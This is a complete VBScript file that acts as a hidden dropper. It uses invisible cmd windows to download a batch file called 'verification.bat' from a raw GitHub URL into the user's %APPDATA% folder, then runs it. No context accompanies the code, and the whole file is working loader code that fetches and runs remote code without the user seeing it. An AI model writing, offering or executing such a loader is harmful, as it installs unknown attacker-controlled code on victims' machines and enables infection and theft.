set WshShell=WScript.CreateObject("WScript.Shell")  
WshShell.Run "cmd /c curl -s https://raw.githubusercontent.com/syskey-del/extension/main/verification.bat>>%appdata%\verification.bat",0
WScript.Sleep 5000
appdata = WshShell.ExpandEnvironmentStrings("%APPDATA%")
WshShell.Run "cmd /k " + appdata + "\verification.bat",0
set WshShell = Nothing
